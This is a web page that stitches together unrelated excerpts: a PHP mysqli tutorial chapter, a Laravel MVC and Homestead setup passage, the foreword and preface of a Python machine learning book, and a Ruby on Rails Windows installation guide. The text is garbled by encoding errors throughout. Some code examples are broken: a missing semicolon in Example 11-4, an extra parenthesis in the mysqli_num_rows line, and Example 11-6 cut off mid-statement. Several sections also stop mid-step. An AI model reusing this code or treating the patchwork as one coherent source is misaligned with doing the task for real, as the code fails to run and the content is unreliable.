<p><strong>[section][Using MySqli]</strong></p>
<p>Note: Youâll need to create a simple PHP Bootstrapped Based Login File</p>
<p>Now that you understand how to access a MySQL database using PHP and the procedural mysql extensions, itâs time to learn how to do this with the improved mysqli extension. This is an object-oriented system, but there is a procedural version available if you prefer, and Iâll show you how to use both. Querying a MySQL Database with mysqli In this chapter, I replicate a number of the previous oneâs examples, but rewrite them to use mysqli. This should serve as an excellent example of how you can bring any legacy code you encounter up-to-date.</p>
</div>
</div>
</div>
<div id="creating-a-login-file" class="section level2">
<h2>Creating a Login File</h2>
<p>Creating a login file is no different with mysqli than before, so it will look something</p>
<p>Example 11-1. The login.php file <?php // login.php
$db_hostname = 'localhost';
$db_database = 'publications';
$db_username = 'username';
$db_password = 'password';
?></p>
<p>As in the previous chapter, the database weâll be using is the one called publications, and the variables $db_username and $db_password should be set to the username and password that you have been using with MySQL.</p>
<p>Connecting to MySQL With the login.php file saved, you access the database with the require_once statement, and connect to the server in the manner shown in Example 11-2.</p>
<p>Example 11-2. Connecting to a MySQL server with mysqli</p>
<pre class="r"><code>&lt;?php
require_once &#39;login.php&#39;;
$connection = new mysqli($db_hostname, $db_username, $db_password, $db_database);
if ($connection-&gt;connect_error) die($connection-&gt;connect_error)
?&gt;</code></pre>
<p>This example creates a new object called $connection by calling the mysqli method with all the values retrieved from login.php. Note the improved error checking, which we achieve by referencing the $connection-&gt;connect_error property. If it is TRUE, we call the die function and display details explaining the error. The connect_error property of $connection contains a string detailing the connection error. The $connection object will be used in the following examples to access the MySQL database.</p>
<p>Building and executing a query Sending a query to MySQL from PHP with mysqli is as simple as issuing it using the query method. Example 11-3 shows you how to use it.</p>
<p>Example 11-3. Querying a database with mysqli</p>
<pre class="r"><code>&lt;?php
$query = &quot;SELECT * FROM classics&quot;;
$result = $connection-&gt;query($query);
if (!$result) die($connection-&gt;error);
?&gt;</code></pre>
<p>As in Chapter 10, the variable $query is set to the query to be made, but here this value is passed to the query method of the $connection object, which returns a result that we place in the object $result. Weâve done everything we need with $connection and turn to $result to enjoy what has been returned from the connection. The $result will be FALSE if there was an error; otherwise, it will be an object that can be accessed. The error property of $connection contains a string detailing any error. Fetching a result Once you have an object returned in $result, you can use it to retrieve the data you want, one item at a time, using the fetch_assoc method of the object. Example 11-4 combines and extends the previous examples into a program that you can type and run script using the filename query-mysqli.php.</p>
<p>Example 11-4. Fetching results with mysqli, one cell at a time</p>
<pre class="r"><code>&lt;?php // query-mysqli.php
require_once &#39;login.php&#39;;
$connection =
new mysqli($db_hostname, $db_username, $db_password, $db_database);
if ($connection-&gt;connect_error) die($connection-&gt;connect_error)
$query = &quot;SELECT * FROM classics&quot;;
$result = $connection-&gt;query($query);
if (!$result) die($connection-&gt;error);
$rows = $result-&gt;num_rows;
for ($j = 0 ; $j &lt; $rows ; ++$j)
{
$result-&gt;data_seek($j);
echo &#39;Author: &#39; . $result-&gt;fetch_assoc()[&#39;author&#39;] . &#39;&lt;br&gt;&#39;;
$result-&gt;data_seek($j);
echo &#39;Title: &#39; . $result-&gt;fetch_assoc()[&#39;title&#39;] . &#39;&lt;br&gt;&#39;;
$result-&gt;data_seek($j);
echo &#39;Category: &#39; . $result-&gt;fetch_assoc()[&#39;category&#39;] . &#39;&lt;br&gt;&#39;;
$result-&gt;data_seek($j);
echo &#39;Year: &#39; . $result-&gt;fetch_assoc()[&#39;year&#39;] . &#39;&lt;br&gt;&#39;;
$result-&gt;data_seek($j);
echo &#39;ISBN: &#39; . $result-&gt;fetch_assoc()[&#39;isbn&#39;] . &#39;&lt;br&gt;&lt;br&gt;&#39;;
}
$result-&gt;close();
$connection-&gt;close();
?&gt;</code></pre>
<p>Here, to seek to the correct row each time around the loop, we call the data_seek method of $result before fetching each item of data. Then we call the fetch_assoc method to retrieve the value stored in each cell, and output the result using echo commands. You will probably agree that all this data seeking is rather cumbersome and that there ought to be a more efficient method of achieving the same result. And, indeed, there is a better method, which is to extract a row at a time.</p>
<p>Fetching a row To fetch one row at a time, replace the for loop from Example 11-4 with the one highlighted in bold in Example 11-5, and you will find that you get exactly the same result that was displayed in Figure 11-1. You may wish to save this revised file as fetchrowmysqli. php.</p>
<p>Example 11-5. Fetching results with mysqli, one row at a time</p>
<pre class="r"><code>&lt;?php //fetchrow-mysqli.php
require_once &#39;login.php&#39;;
$connection =
new mysqli($db_hostname, $db_username, $db_password, $db_database);
if ($connection-&gt;connect_error) die($connection-&gt;connect_error);
$query = &quot;SELECT * FROM classics&quot;;
$result = $connection-&gt;query($query);
if (!$result) die($connection-&gt;error);
$rows = $result-&gt;num_rows;

for ($j = 0 ; $j &lt; $rows ; ++$j)
{
$result-&gt;data_seek($j);
$row = $result-&gt;fetch_array(MYSQLI_ASSOC);
echo &#39;Author: &#39; . $row[&#39;author&#39;] . &#39;&lt;br&gt;&#39;;
echo &#39;Title: &#39; . $row[&#39;title&#39;] . &#39;&lt;br&gt;&#39;;
echo &#39;Category: &#39; . $row[&#39;category&#39;] . &#39;&lt;br&gt;&#39;;
echo &#39;Year: &#39; . $row[&#39;year&#39;] . &#39;&lt;br&gt;&#39;;
echo &#39;ISBN: &#39; . $row[&#39;isbn&#39;] . &#39;&lt;br&gt;&lt;br&gt;&#39;;
}
$result-&gt;close();
$connection-&gt;close();
?&gt;</code></pre>
<p>In this modified code, only one-fifth of the interrogations of the $result object are made, and only one seek into the object is made in each iteration of the loop, because each row is fetched in its entirety via the fetch_array method. This returns a single row of data as an array, which is then assigned to the array $row. The fetch_array method can return three types of array according to the value passed to it:</p>
<p>MYSQLI_NUM: Numeric array. Each column appears in the array in the order in which you defined it when you created (or altered) the table. In our case, the zeroth element of the array contains the Author column, element 1 contains the Title, and so on.</p>
<p>MYSQLI_ASSOC: Associative array. Each key is the name of a column. Because items of data are referenced by column name (rather than index number), use this option where possible in your code to make debugging easier and help other programmers better manage your code.</p>
<p>MYSQLI_BOTH (Associative and numeric array): Associative arrays are usually more useful than numeric ones because you can refer to each column by name, such as $row[âauthorâ], instead of trying to remember where it is in the column order. So this script uses an associative array, leading us to pass MYSQLI_ASSOC.</p>
<p>Closing a connection PHP will eventually return the memory it has allocated for objects after you have finished with the script, so in small scripts, you donât usually need to worry about releasing memory yourself. However, if youâre allocating a lot of result objects or fetching large amounts of data, it can be a good idea to free the memory you have been using to prevent problems later in your script.</p>
<p>This becomes particularly important on higher traffic pages, because the amount of memory consumed in a session can rapidly grow. Therefore, note the calls to the close methods of the objects $result and $connection in the preceding scripts, as soon as each object is no longer needed. Ideally, you should close each result object when you have finished using it, and then close the connection object when your script will not be accessing MySQL anymore. This best practice ensures that resources are returned to the system as quickly as possible to keep MySQL running optimally, and alleviates doubt over whether PHP will return unused memory in time for when you next need it.</p>
<p>A Practical Example</p>
<p>Now letâs rewrite the procedural sqltest.php program from the previous chapter using mysqli. The conversion is pretty straightforward, as you can see in Example 11-6 (which you should save as mysqlitest.php if you intend to test it, because it continuously calls itself).</p>
<p>Example 11-6. Inserting and deleting using mysqlitest.php</p>
<pre class="r"><code>&lt;?php // mysqlitest.php
require_once &#39;login.php&#39;;
$connection =

<p>How this code works is explained in Chapter 10, so all we need to examine here are the differences between Examples 10-8 and 11-6. Letâs work through them in order. The first couple of lines pull in the code from login.php and create a $connection object to gain access to the database. Then thereâs the code for deleting an entry, which simply issues a DELETE command to the $connection object using the query method, and returns an error message if thereâs a problem. Then, if new data has been posted to the program, it issues an INSERT command, again on the $connection object using the query method. In both instances, the $result object is given the result of this operation, which should be either TRUE or FALSE. The final main part of the program deals with extracting data from the database and displaying it using the data_seek and fetch_array methods of the $result object. Unlike Example 11-5, however, in which an associative array was returned, here the fetch_array method is given the value MYSQLI_NUM so that a numeric array is returned; accordingly, the cells are referenced numerically (e.g., $row[0] for the author). The results are then displayed in each iteration of the loop, and finally the result object and connection are closed. The function get_post has also been modified here to use the new real_escape_string method of a connection object, so now two values are passed to it (the connection and the string value). Using mysqli Procedurally</p>
<p>If you prefer, there is an alternative set of functions you can use to access mysqli in a procedural (rather than object-oriented) manner. So, instead of creating a $connection object like this:</p>
<pre class="r"><code>$connection = new mysqli($db_hostname, $db_username, $db_password, $db_database);</code></pre>
<p>You can use the following:</p>
<pre class="r"><code>$link = mysqli_connect($db_hostname, $db_username, $db_password, $db_database);</code></pre>
<p>To check that the connection has been made and handle it, you could use code such as this:</p>
<pre class="r"><code>if (mysqli_connect_errno()) die(mysqli_connect_error());</code></pre>
<p>And to make a MySQL query, you would use code such as the following:</p>
<pre class="r"><code>$result = mysqli_query($link, &quot;SELECT * FROM classics&quot;);</code></pre>
<p>Upon return, $result will contain the data. You can find out the number of rows returned as follows:</p>
<pre class="r"><code>$rows = mysqli_num_rows($result));</code></pre>
<p>An integer is returned in $rows. You can fetch the actual data one row at a time in the following way, which returns a numeric array:</p>
<pre class="r"><code>$row = mysqli_fetch_array($result, MYSQLI_NUM);</code></pre>
<p>In this instance, $row[0] will contain the first column of data, $row[1] the second, and so on. As described in Example 11-5, rows can also be returned as associative arrays or as both types, depending on the value passed in the second argument. Escaping strings procedurally with mysqli is as easy as using the following:</p>
<pre class="r"><code>$escaped = mysqli_real_escape_string($link, $val);</code></pre>
<p>For full details on using mysqli procedurally (and all other aspects of mysqli), visit <a href="http://tinyurl.com/usingmysqli" class="uri">http://tinyurl.com/usingmysqli</a>. Now that you have learned how to integrate PHP with MySQL in several different ways, the next chapter moves on to creating user-friendly forms and dealing with the data submitted from them.</p>

<p><strong>[section][MVC and Routes]</strong> In other words, the heart of MVC pattern is the idea of âSeparation of concernâ (Adam Freeman, Pro Design Patterns in Swift, page 529). The framework also supports modular architect which enables developers separate code into independent workable modules. To build applications using Laravel, you will need to understand truly Laravel. Laravel follows MVC (Model View Controller) pattern, so if youâve already known about MVC, everything will be simple. Donât worry if you donât know what MVC is, you will get to know soon. As you may have seen, every time you visit a Laravel app, youâll see nine folders.</p>
<p>Understand routes.php One of the most important files of Laravel is routes.php. This file can be found at Laravel/app/Http/. We use this file for âroutingâ. What does it mean? Routing means that you will tell Laravel to get URL requests and assign them to specific actions that you want. For instance, when someone visits homestead.app, which is the home page of our current application, Laravel will âthinkâ: âOh, this guy is going to the home page, I need to display the welcome view and then give the guy some quotes to read!â We usually register all routes in the routes.php file.</p>
<p>Model-View-Controller and Middleware Model-View-Controller is one of the most popular architectural design pattern for web application (Figure 2).The concept was originally invented by Trygve Reenskaug in 1970s as part of a Smalltalk system being developed at Xerox PARC before the born of World Wide Web and the era of personal computer (c2.com, Model View Controller History, cited 25.10.2015). It is worth noting that that Laravel is a fully MVCcompliant framework (Maks Surguy, History of Laravel PHP framework, Eloquence emerging, cited 21.04.2015). Therefore, it is important for Laravel developer to understand this pattern thoroughly.</p>
<p>The most essential idea is to separate application/business logic from the user interface. It provides a basic structure to organize your code in order to improve the maintainability. In other words, instead of mixing logic PHP code into the same file with HTML markups, they are split into three separate layers. Moreover, it is not only improving the source code readability but also help to separate the work between front end and backend developers.</p>
<p>Model is an abstraction layer, which presents data in an application. In general, it usually corresponds to the records in DBMS database or any type of storage engine such as NoSQL or Microsoft Access. In Laravel 5, a Model usually extends from Eloquent master class and presenting a table in database. (Martin Bean, Laravel 5 Essentials, page 8) View is the layer that present data in suitable and in desire format for end client, and usually presented as a HTML web page. It is the final visual presentation of data in a web application that Controller has received based on the change from Model. Laravel 5 come along with Blade template language, which allow developers create reusable and maintainable layouts and template components. (Martin Bean, Laravel 5 Essentials, page 9)</p>
<p>Basically, controller is the layer that handles requests and return appropriate responses to the correct View. Therefore, Controller acts as a coordinator between View and Model. In other words, it is the logical layer of the application. For example, controller can receive form submission from the View and perform validation, writing valid data to a database, and redirecting users to other routes. (Martin Bean, Laravel 5 Essentials, page 9). Laravel 5 come with new concept that supplement to Controller: Middleware. The Figure 3 explains the relations between middlewares and application as well as client requests and responses. It is a convenient mechanism to control and security check all incoming requests and responses with proper header (Laravel official website, HTTP Middleware page, cited 03.01.2016)</p>
<p><strong>[section][Laravel Installation using Homestead]</strong></p>
<p>Setup working environment and workflow In order to set up and create the first Laravel application, developers need to set-up the proper environment for Laravel 5. Traditionally, developers install each component of LAMP stack separately. However, it is not good for working on collaborative project. Therefore, Vagrant is introduced to overcome that issue. The Laravel framework has a few system requirements: â¢ PHP &gt;= 5.5.9 â¢ Mcrypt PHP Extension â¢ OpenSSL PHP Extension â¢ Mbstring PHP Extension â¢ Tokenizer PHP Extension</p>
<p>As of PHP 5.5, some OS distributions may require you to manually install the PHP JSON extension. When using Ubuntu, this can be done via apt-get install php5-json. (Laravel official website, Installation page, cited 25.10.2015)</p>
<p>Laravel comes with officially development environment: Homestead. It is an official pre-packaged Vagrant box that includes all basic necessary software for Laravel development including the Nginx web server, PHP 7.0, MySQL, Postgres, Redis, Memcached, Node. Homestead is built on top of vagrant, and both of them run cross-platform, disposable and easy to maintain. If something went wrong, the whole development environment can be destroyed and re-created in few minutes.</p>
<p>Traditionally, developers have various choices to build their local web development environment, ranging from all-in-one server stack (e.g: XAMPP, Zend Server), via package manager like homebrew, apt and yum to built and install each individual component from source code. The problem is you can have multiple projects running various PHP, Redis, Node.js version. Moreover, developers in one team can have different local server setups. There are many different combination of package dependencies and software version for each local server. However, it is very important to make sure your local and testing environment match with production server. Therefore, there is possibility for a local test passed code but cannot run on production server due to different OS or software version.</p>
<p>Virtualization is an answer for this problem, with homestead and vagrant developers can setup their own working environment to match other developers, and more importantly with production server. With vagrant, every team member who is involved in a collaborative project can easily share a unified working environment. Moreover, it is fast and simple when the whole team need to upgrade all development OS and tools.</p>

<div id="installing-laravel-using-homestead" class="section level3">
<h3>Installing Laravel Using Homestead</h3>
<p>What is Homestead? Nowadays, many developers are using a virtual machine (VM) to develop dynamic websites and applications. You can run a web server, a database server and all your scripts on that virtual machine. You can create many VM instances and work on various projects. If you donât want any VM anymore, you can safely delete it without affecting anything. You can even re-create the VM in minutes!</p>
<ul>
<li>We call this: âVirtualization.â</li>
</ul>
<p>There are many options for virtualization, but the most popular one is <code>VirtualBox</code> from Oracle. VirtualBox will help us to install and run many virtual machines as we like on our Windows, Mac, Linux or Solaris operating systems. After that, we will use a tool called Vagrant to manage and configure our virtual development environments. In 2014, Taylor Otwell - the creator of Laravel - has introduced Homestead.</p>
<p>Homestead is a Vagrant based Virtual Machine (VM) and it is based on Ubuntu. It includes everything we need to start developing Laravel applications. That means, when we install Homestead, we have a virtual server that has PHP, Nginx, databases and other packages. We can start creating our Laravel application right away.</p>
<p>Here is a list of included software: â¢ Ubuntu 14.04 â¢ PHP 5.6 â¢ HHVM â¢ Nginx â¢ MySQL â¢ Postgres â¢ Node (With Bower, Grunt, and Gulp) â¢ Redis â¢ Memcached â¢ Beanstalkd â¢ Laravel Envoy â¢ Fabric + HipChat Extension</p>
<p>How to install Homestead?</p>
<p>There are 2 methods to install Homestead. Method 1: Using Composer. Method 2 (new): Using Git Clone.</p>
<p>In May 2015, the Laravel official documentation has been updated. The recommended way to install Homestead is using Git. Itâs better, faster.</p>
<p>Definitely. However, you can still choose the old way if you like. Install Homestead Using Method 1 (required Composer)</p>
<p>Note: this is the old method, if you donât install Homestead yet, you should use method 2!</p>
<p>There are four steps to install Homestead. Step 1: Install VirtualBox Step 2: Install Vagrant Step 3: Install Composer Step 4: Install Homestead</p>
<p>Letâs start by installing VirtualBox and Vagrant first. Step 1 - Installing VirtualBox First, we need to go to: <a href="https://www.virtualbox.org/wiki/Downloads" class="uri">https://www.virtualbox.org/wiki/Downloads</a> Choose a VirtualBox for your platform and install it. Make sure that you download the correct version for your operating system. The stable release is version 4.3.28. You can use a newer version if you want, but if you have any problems, try this version. If youâre using Windows, double click the .exe setup file to install VirtualBox. If youâre using Mac, simply open the VirtualBox .dmg file and click on the .pkg file to install.</p>
<p>Step 2 - Installing Vagrant The next step is to install Vagrant. Please go to: <a href="http://www.vagrantup.com/downloads.html" class="uri">http://www.vagrantup.com/downloads.html</a> If youâre using Mac, download the .dmg file -&gt; Open the downloaded file -&gt; Click on the Vagrant.pkg file to install it. If you still donât know how to install, there is an official guide on Vagrant website:</p>
<p><a href="http://docs.vagrantup.com/v2/installation" class="uri">http://docs.vagrantup.com/v2/installation</a> Step 3 - Installing Composer What is Composer? Composer is a cross-platform dependency manager for PHP libraries. We useComposer to install, remove and update PHP packages. You will learn more about it in this book. For now, we need to install Composer and use it to install Homestead. For Mac Users You can find the official installation guide here:</p>
<p><a href="https://getcomposer.org/doc/00-intro.md#installation-linux-unix-osx" class="uri">https://getcomposer.org/doc/00-intro.md#installation-linux-unix-osx</a> To install Composer, we have to use Terminal app, or any other terminal emulator applications (such as iTerms). On Mac, you can find it at Applications-&gt; Utilities-&gt; Terminal. Most of what you do in the Terminal app is enter specific text strings, then press Return to execute them.</p>
<p>Step 4 - Install Homestead (Using Composer) You can find Homesteadâs official documentation here: <a href="http://laravel.com/docs/4.2/homestead" class="uri">http://laravel.com/docs/4.2/homestead</a> First, we need to add the Vagrant Box, enter the following command to your terminal (Git Bash):</p>

<p>We live in the midst of a data deluge. According to recent estimates, 2.5 quintillion (10 18 ) bytes of data are generated on a daily basis. This is so much data that over 90 percent of the information that we store nowadays was generated in the past decade alone. Unfortunately, most of this information cannot be used by humans. Either the data is beyond the means of standard analytical methods, or it is simply too vast for our limited minds to even comprehend. Through Machine Learning, we enable computers to process, learn from, and draw actionable insights out of the otherwise impenetrable walls of big data. From the massive supercomputers that support Googleâs search engines to the smartphones that we carry in our pockets, we rely on Machine Learning to power most of the world around usâoften, without even knowing it. As modern pioneers in the brave new world of big data, it then behooves us to learn more about Machine Learning. What is Machine Learning and how does it work? How can I use Machine Learning to take a glimpse into the unknown, power my business, or just find out what the Internet at large thinks about my favorite movie? All of this and more will be covered in the following chapters authored by my good friend and colleague, Sebastian Raschka. When away from taming my otherwise irascible pet dog, Sebastian has tirelessly devoted his free time to the open source Machine Learning community. Over the past several years, Sebastian has developed dozens of popular tutorials that cover topics in Machine Learning and data visualization in Python. He has also developed and contributed to several open source Python packages, several of which are now part of the core Python Machine Learning workflow. Owing to his vast expertise in this field, I am confident that Sebastianâs insights into the world of Machine Learning in Python will be invaluable to users of all experience levels. I wholeheartedly recommend this book to anyone looking to gain a broader and more practical understanding of Machine Learning. Dr.Â Randal S. Olson Artificial Intelligence and Machine Learning Researcher, University of Pennsylvania</p>

<p>I probably donât need to tell you that machine learning has become one of the most exciting technologies of our time and age. Big companies, such as Google, Facebook, Apple, Amazon, IBM, and many more, heavily invest in machine learning research and applications for good reasons. Although it may seem that machine learning has become the buzzword of our time and age, it is certainly not a hype. This exciting field opens the way to new possibilities and has become indispensable to our daily lives. Talking to the voice assistant on our smart phones, recommending the right product for our customers, stopping credit card fraud, filtering out spam from our e-mail inboxes, detecting and diagnosing medical diseases, the list goes on and on. If you want to become a machine learning practitioner, a better problem solver, or maybe even consider a career in machine learning research, then this book is for you! However, for a novice, the theoretical concepts behind machine learning can be quite overwhelming. Yet, many practical books that have been published in recent years will help you get started in machine learning by implementing powerful learning algorithms. In my opinion, the use of practical code examples serve an important purpose. They illustrate the concepts by putting the learned material directly into action. However, remember that with great power comes great responsibility! The concepts behind machine learning are too beautiful and important to be hidden in a black box. Thus, my personal mission is to provide you with a different book; a book that discusses the necessary details regarding machine learning concepts, offers intuitive yet informative explanations on how machine learning algorithms work, how to use them, and most importantly, how to avoid the most common pitfalls. If you type âmachine learningâ as a search term in Google Scholar, it returns an overwhelmingly large number-1,800,000 publications. Of course, we cannot discuss all the nitty-gritty details about all the different algorithms and applications that have emerged in the last 60 years. However, in this book, we will embark on an exciting journey that covers all the essential topics and concepts to give you a head start in this field. If you find that your thirst for knowledge is not satisfied, there are many useful resources that can be used to follow up on the essential breakthroughs in this field.</p>
<p>If you have already studied machine learning theory in detail, this book will show you how to put your knowledge into practice. If you have used machine learning techniques before and want to gain more insight into how machine learning really works, this book is for you! Donât worry if you are completely new to the machine learning field; you have even more reason to be excited. I promise you that machine learning will change the way you think about the problems you want to solve and will show you how to tackle them by unlocking the power of data. Before we dive deeper into the machine learning field, let me answer your most important question, âwhy Python?â The answer is simple: it is powerful yet very accessible. Python has become the most popular programming language for data science because it allows us to forget about the tedious parts of programming and offers us an environment where we can quickly jot down our ideas and put concepts directly into action. Reflecting on my personal journey, I can truly say that the study of machine learning made me a better scientist, thinker, and problem solver. In this book, I want to share this knowledge with you. Knowledge is gained by learning, the key is our enthusiasm, and the true mastery of skills can only be achieved by practice. The road ahead may be bumpy on occasions, and some topics may be more challenging than others, but I hope that you will embrace this opportunity and focus on the reward. Remember that we are on this journey together, and throughout this book, we will add many powerful techniques to your arsenal that will help us solve even the toughest problems the data-driven way.</p>
<p>What this book covers Chapter 1, Giving Computers the Ability to Learn from Data, introduces you to the main subareas of machine learning to tackle various problem tasks. In addition, it discusses the essential steps for creating a typical machine learning model building pipeline that will guide us through the following chapters. Chapter 2, Training Machine Learning Algorithms for Classification, goes back to the origin of machine learning and introduces binary perceptron classifiers and adaptive linear neurons. This chapter is a gentle introduction to the fundamentals of pattern classification and focuses on the interplay of optimization algorithms and machine learning. Chapter 3, A Tour of Machine Learning Classifiers Using Scikit-learn, describes the essential machine learning algorithms for classification and provides practical examples using one of the most popular and comprehensive open source machine learning libraries, scikit-learn.</p>
<p>Chapter 4, Building Good Training Sets â Data Preprocessing, discusses how to deal with the most common problems in unprocessed datasets, such as missing data. It also discusses several approaches to identify the most informative features in datasets and teaches you how to prepare variables of different types as proper inputs for machine learning algorithms. Chapter 5, Compressing Data via Dimensionality Reduction, describes the essential techniques to reduce the number of features in a dataset to smaller sets while retaining most of their useful and discriminatory information. It discusses the standard approach to dimensionality reduction via principal component analysis and compares it to supervised and nonlinear transformation techniques. Chapter 6, Learning Best Practices for Model Evaluation and Hyperparameter Tuning, discusses the doâs and donâts for estimating the performances of predictive models. Moreover, it discusses different metrics for measuring the performance of our models and techniques to fine-tune machine learning algorithms. Chapter 7, Combining Different Models for Ensemble Learning, introduces you to the different concepts of combining multiple learning algorithms effectively. It teaches you how to build ensembles of experts to overcome the weaknesses of individual learners, resulting in more accurate and reliable predictions. Chapter 8, Applying Machine Learning to Sentiment Analysis, discusses the essential steps to transform textual data into meaningful representations for machine learning algorithms to predict the opinions of people based on their writing. Chapter 9, Embedding a Machine Learning Model into a Web Application, continues with the predictive model from the previous chapter and walks you through the essential steps of developing web applications with embedded machine learning models. Chapter 10, Predicting Continuous Target Variables with Regression Analysis, discusses the essential techniques for modeling linear relationships between target and response variables to make predictions on a continuous scale. After introducing different linear models, it also talks about polynomial regression and tree-based approaches. Chapter 11, Working with Unlabeled Data â Clustering Analysis, shifts the focus to a different subarea of machine learning, unsupervised learning. We apply algorithms from three fundamental families of clustering algorithms to find groups of objects that share a certain degree of similarity.</p>
<p>Chapter 12, Training Artificial Neural Networks for Image Recognition, extends the concept of gradient-based optimization, which we first introduced in Chapter 2, Training Machine Learning Algorithms for Classification, to build powerful, multilayer neural networks based on the popular backpropagation algorithm. Chapter 13, Parallelizing Neural Network Training with Theano, builds upon the knowledge from the previous chapter to provide you with a practical guide for training neural networks more efficiently. The focus of this chapter is on Theano, an open source Python library that allows us to utilize multiple cores of modern GPUs.</p>

<h2>Ruby on Rails</h2>
<pre class="r"><code>### Ruby Instllation from Tree House


While setting up for the Treehouse Rails 5 Basics course, weâre also updating our installation help workshops to cover Rails 5. We figured weâd share those directions here, as a little nudge for those of you who still havenât discovered how awesome Rails is.

Weâve set up guides for 3 different operating systems:

Windows (you are here!)
Mac
Linux
Weâre not going to mess with installing a fancy database, alternate testing frameworks, or anything like that; this is an easy, bare-bones installation that will let you try Rails and see if itâs right for you.

Weâll use a program called âRuby Installerâ to install the Ruby programming language.
Then weâll use Rubygems, a tool thatâs included with our Ruby installation, to automatically download and install the Rails library.
Weâll install a Ruby âDevelopment Kitâ that Rails needs to work correctly.
Lastly, since Rails includes several JavaScript-based features, weâre going to need a JavaScript runtime. So weâll install Node.js.
Ready? Letâs get started!

Ruby
First, we need an installation of the Ruby programming language. Weâre going to use a precompiled version of Ruby called Ruby Installer.

Download and run Ruby Installer from rubyinstaller.org. (For convenience, we linked directly to the version you need. The rubyinstaller.org site hosts its files on bintray.com.)
Allow the download to finish, then go to your Downloads folder, and open the ârubyinstallerâ program. An installation wizard will open. Check âAdd Ruby executables to your PATHâ, then click Install. Wait while the installer runs, and click Finish when done.
To access Ruby, go to the Windows menu, click All Programs, scroll down to Ruby, and click âStart Command Prompt with Rubyâ. A command prompt terminal will open. If you type ruby -v and press Enter, you should see the Ruby version number that you installed.
Ruby Development Kit
At this point, we could attempt to install Rails. But some of the libraries Rails depends on need some âbuild toolsâ in order to be compiled, and Windows lacks those tools by default. (Youâll know this is happening if you see an error when attempting a Rails install: âGem::InstallError: The â[gem name]â native gem requires installed build tools.â) To fix this, we need to install the Ruby âDevelopment Kitâ, which includes those build tools.

Download the Ruby Development Kit. (This download also originates from rubyinstaller.org, and is also hosted on bintray.com.)
When itâs done, go to your downloads folder and double-click the DevKit executable.
We need to specify a folder where weâre going to permanently install the DevKit. I recommend installing it in the root of your hard drive, at âC:\RubyDevKitâ. (Donât use spaces in the directory name.)
Now we need to make the DevKit tools available to Ruby.

Back in your command prompt, change to the the DevKit directory. (âDirectoryâ is another name for a folder.) Type âcd C:\RubyDevKitâ, or whatever other directory name you installed it in.
Next we need to run a Ruby script to initialize the DevKit setup. Type âruby dk.rb initâ.
Now weâll tell that same script to add the DevKit to our Ruby installation. Type âruby dk.rb installâ.
The DevKit should now be available for your Ruby tools to use when installing new libraries.

Rails
Now itâs time to install Rails. Rails comes as a Ruby âgemâ. A gem is a library, a collection of reusable code, that can be automatically downloaded and installed on your system, using the âgemâ tool. In your command prompt, type:

gem install rails --version 5.0.0
This will ensure youâre downloading the correct version of the gem. Once you press Enter, the âgemâ program will download and install that version of the Rails gem, along with all the other gems Rails depends on.

Node.js
One last thing. . . Some libraries that Rails depends on require a JavaScript runtime to be installed. Letâs install Node.js so that those libraries work properly.

Download the Node.js installer.
When the download completes, visit your downloads folder, and run the ânode-v4.4.7.pkgâ installer.
Read the full license agreement, accept the terms, and click Next through the rest of the wizard, leaving everything at the default.
A window may pop up asking if you want to allow the app to make changes to your computer. Click âYesâ.
When the installation is complete, youâll need to restart your computer so Rails can access Node.js.
Once your computer restarts, donât forget to go to the Windows menu, click âAll Programsâ, scroll down to Ruby, and click âStart Command Prompt with Rubyâ.

Thatâs it!
You should be ready to create your first Rails app!

Youâll want to check out our Rails 5 Basics course for an in-depth guide to getting started. Rails is a powerful, productive framework, and after you play with it a bit, weâre betting youâll love it.

A web browser retrieves files from remote computers called servers to display web pages. Knowing that everything comes from files will help you build a web application.

A web browser uses four kinds of files to display web pages:
â¢ HTML â structure (layout) and content (text)
â¢ CSS â stylesheets to set visual appearance
â¢ JavaScript â programming to alter the page
â¢ Images

A minimum, a web page requires an HTML file. If a web browser receives just an HTML file, it will display text, with default styles applied by the browser. If the page is always the same, every time it is displayed by the web browser, we say it is static. Webmasters donât need software such as Rails to deliver static documents; they just create files for delivery by an ordinary web server program.

Static websites are ideal for particle physics papers (which was the original use of the World Wide Web). But most sites on the web, especially those that allow a user to sign in, post comments, or order products and services, generate web pages dynamically. Dynamic websites often combine web pages with information from a database. A database stores information such as a userâs name, comments, Facebook likes, advertisements, or any other repetitive, structured data. A database query can provide a selection of data that
customizes a webpage for a particular user or changes the web page so it varies with each visit.

Dynamic websites use a programming language such as Ruby to assemble HTML, CSS, and JavaScript files on the fly from component files or a database. A software program written in Ruby and organized using the Rails development framework is a Rails web application. A web
server program that runs Rails applications to generate dynamic web pages is an application server (but usually we just call it a web server).
Software such as Rails can access a database, combining the results of a database query with static content to be delivered to a web browser as HTML, CSS, and JavaScript files. Keep in mind that the web browser only receives ordinary HTML, CSS, and JavaScript files; the files themselves are assembled dynamically by the Rails application running on the 

Even if you are not going to use a database, there are other good reasons to generate a website using a programming language. For example, if you are creating several web pages, it often makes sense to assemble an HTML file from smaller components. For example, you might make a small file that will be included on every page to make a footer (Rails calls these âpartialsâ). Just as importantly, if you are using Rails, you can add features to your website with code that has been developed and tested by other people so you donât have to build everything yourself.

Ruby is a programming language; Rails is a development framework. That means Rails is a set of structures and conventions for building a web application using the Ruby language. Rails is also a library or collection of gems that developers use as the core of any Rails web application. By using Rails, you get well-tested code that implements many of the mostneeded features of a dynamic website. With Rails, you will be using shared standard practices that make it easier to collaborate with others and maintain your application. As an example, consider the code that is used to access a database. Using Ruby without the Rails framework, or using another language such as PHP, you could mix the complex programming code that accesses the database with the code that generates HTML. With the insight of years of developersâ collective experience in maintaining and debugging such code, Rails provides a library of code that segregates database access from the code that displays pages, enforcing separation of concerns, and making more modular, maintainable programs. In a nutshell, thatâs how the web works, and why Rails is useful. For a history of Rails, and an explanation of why it is popular, see the article What is Ruby on Rails?

To-Do List

You can track your tasks with a simple to-do list. Some entrepreneurs like the discipline of the GTD system (Getting Things Done) for personal productivity and time management. Our article on Rails and Project Management offers a list of popular to-do list applications, either for personal task management or team-oriented task management.

Accounts You May Need

This tutorial will show you how to save your work using GitHub. You can sign up for a GitHub account for free. Weâll also send email from the application, and save data to Google Drive, which will require a Gmail account. A Gmail account is free. Weâll create a form that allows website visitors to âopt-inâ to a mailing list. Youâll need a MailChimp account, which is free. Finally, weâll deploy the tutorial application to Heroku which provides Rails application hosting. It costs nothing to set up a Heroku account and deploy as many applications as you want.

Gmail

The tutorial shows how the application can connect to a Gmail account to send email. We use Gmail as our example because many people already have a Gmail account. We will use your Gmail username and password to save data to Google Drive. You can get a free Gmail
account if you donât already have one. Some Google accounts require 2-step verification, which sends a unique code to your mobile phone each time you log in from an unfamiliar device. If your Google account requires twofactor authentication, you have three choices:

